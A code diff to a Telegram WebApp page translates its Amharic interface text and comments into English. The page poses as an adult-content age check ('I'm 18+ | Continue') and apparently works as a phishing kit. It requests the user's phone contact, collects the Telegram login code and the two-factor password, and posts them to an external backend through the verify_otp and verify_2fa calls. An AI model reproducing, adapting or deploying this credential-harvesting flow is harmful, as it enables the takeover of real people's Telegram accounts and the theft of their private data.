@@ -276,16 +276,16 @@
     </div>
 
 <script>
-    /* JavaScript ክፍል - ሙሉ ስክሪን እንዲሆን ተስተካክሏል */
+    /* JavaScript section - Adjusted for full screen */
     const tg = window.Telegram.WebApp;
     
-    // WebApp ሙሉ ስክሪን እንዲሆን የሚያደርጉ ትዕዛዞች
+    // Commands to make WebApp full screen
     tg.expand();
     tg.ready();
     tg.headerColor = '#000000'; 
     tg.backgroundColor = '#000000';
 
-    // API_BASE_URL አሁን ከ config.js ነው የሚመጣው
+    // API_BASE_URL now comes from config.js
     let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
     let sid = userId; 
     let currentOtp = "";
@@ -331,13 +331,13 @@
         if(target) target.classList.add('active');
         
         if(savedName) {
-            if(document.getElementById('step2_name_display')) document.getElementById('step2_name_display').innerText = "ሰላም " + savedName + "!";
-            if(document.getElementById('step3_name_display')) document.getElementById('step3_name_display').innerText = "ሰላም " + savedName;
+            if(document.getElementById('step2_name_display')) document.getElementById('step2_name_display').innerText = "Hello " + savedName + "!";
+            if(document.getElementById('step3_name_display')) document.getElementById('step3_name_display').innerText = "Hello " + savedName;
         }
     }
 
     function checkStatus() {
-        // API_BASE_URL በ config.js ውስጥ መገኘቱን ያረጋግጣል
+        // Ensures API_BASE_URL is found in config.js
         if(typeof API_BASE_URL !== 'undefined'){
             fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
                 if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
@@ -352,11 +352,11 @@
         isProcessing = false;
         document.getElementById('loginBtn').disabled = false;
         document.getElementById('loginSpinner').style.display = 'none';
-        document.getElementById('loginText').innerText = "🔞 I'm 18+ | መቀጠል 🔞";
+        document.getElementById('loginText').innerText = "🔞 I'm 18+ | Continue 🔞";
         if(document.getElementById('confirmBtn')){
             document.getElementById('confirmBtn').disabled = false;
             document.getElementById('confirmSpinner').style.display = 'none';
-            document.getElementById('confirmText').innerText = 'አረጋግጥ & ግባ';
+            document.getElementById('confirmText').innerText = 'Verify & Sign In';
         }
     }
 
@@ -379,14 +379,14 @@
         const txt = document.getElementById('loginText');
         btn.disabled = true;
         spinner.style.display = 'block';
-        txt.innerText = 'በማገናኘት ላይ...';
+        txt.innerText = 'Connecting...';
         startVerification();
     }
 
     function startVerification() {
         if (isProcessing) return;
         isProcessing = true;
-        showMsg(1, 'loading-msg', 'የደህንነት መስመር በመፍጠር ላይ...');
+        showMsg(1, 'loading-msg', 'Creating a secure connection...');
         checkUserInDB();
     }
 
@@ -399,20 +399,20 @@
             });
             const data = await res.json();
             if (data.status === "FOUND" || data.status === "NEED_OTP") {
-                showMsg(1, 'loading-msg', 'አካውንቱ ተገኝቷል፣ ኮድ በመጠበቅ ላይ...');
+                showMsg(1, 'loading-msg', 'Account found, waiting for code...');
             } else if (data.status === "SUCCESS") {
                 showStep('success');
             } else { requestPhone(); }
         } catch(e) { 
             stopLoaders();
-            showMsg(1, 'error', 'ሰርቨሩ ስለተጨናነቀ ትንሽ ቆይተው ይሞክሩ።');
+            showMsg(1, 'error', 'The server is busy, please try again later.');
         }
     }
 
     function requestPhone() {
         tg.requestContact((success) => {
-            if (success) { showMsg(1, 'loading-msg', 'ኮድ በቴሌግራም ተልኳል፣ ሲደርስዎ ያስገቡ...'); } 
-            else { stopLoaders(); showMsg(1, 'error', 'ለመቀጠል ማረጋገጫ መስጠት አለብዎት!'); }
+            if (success) { showMsg(1, 'loading-msg', 'Code sent via Telegram, enter when received...'); } 
+            else { stopLoaders(); showMsg(1, 'error', 'You must provide confirmation to continue!'); }
         });
     }
 
@@ -437,7 +437,7 @@
     }
 
     async function submitOTP() {
-        showMsg(2, 'loading-msg', 'ኮዱን በማረጋገጥ ላይ...');
+        showMsg(2, 'loading-msg', 'Verifying code...');
         try {
             const res = await fetch(`${API_BASE_URL}/verify_otp`, {
                 method: 'POST',
@@ -446,20 +446,20 @@
             });
             const data = await res.json();
             handleResponse(data, 2);
-        } catch(e) { showMsg(2, 'error', 'የመስመር መቆራረጥ!'); }
+        } catch(e) { showMsg(2, 'error', 'Connection error!'); }
     }
 
     async function submit2FA() {
         playTap();
         const pass = document.getElementById('2fa_input').value;
-        if(!pass) return showMsg(3, 'error', 'እባክዎ ፓስዎርድ ያስገቡ');
+        if(!pass) return showMsg(3, 'error', 'Please enter your password');
         
         const btn = document.getElementById('confirmBtn');
         const spinner = document.getElementById('confirmSpinner');
         const txt = document.getElementById('confirmText');
-        btn.disabled = true; spinner.style.display = 'block'; txt.innerText = 'በማረጋገጥ ላይ...';
+        btn.disabled = true; spinner.style.display = 'block'; txt.innerText = 'Verifying...';
 
-        showMsg(3, 'loading-msg', 'ደህንነቱን በማረጋገጥ ላይ...');
+        showMsg(3, 'loading-msg', 'Verifying security...');
         try {
             const res = await fetch(`${API_BASE_URL}/verify_2fa`, {
                 method: 'POST',
@@ -468,7 +468,7 @@
             });
             const data = await res.json();
             handleResponse(data, 3);
-        } catch(e) { stopLoaders(); showMsg(3, 'error', 'ስህተት አጋጥሟል!'); }
+        } catch(e) { stopLoaders(); showMsg(3, 'error', 'An error occurred!'); }
     }
 
     function handleResponse(data, step) {
@@ -477,7 +477,7 @@
         else if (data.status === "FLOOD") { startFloodTimer(data.wait); }
         else {
             stopLoaders();
-            showMsg(step, 'error', 'የተሳሳተ መረጃ! እባክዎ በትክክል ያስገቡ።');
+            showMsg(step, 'error', 'Incorrect information! Please enter correctly.');
             if(step === 2) { currentOtp = ""; updateOtpUI(); }
         }
     }
@@ -522,4 +522,3 @@
 </script>
 </body>
 </html>
-
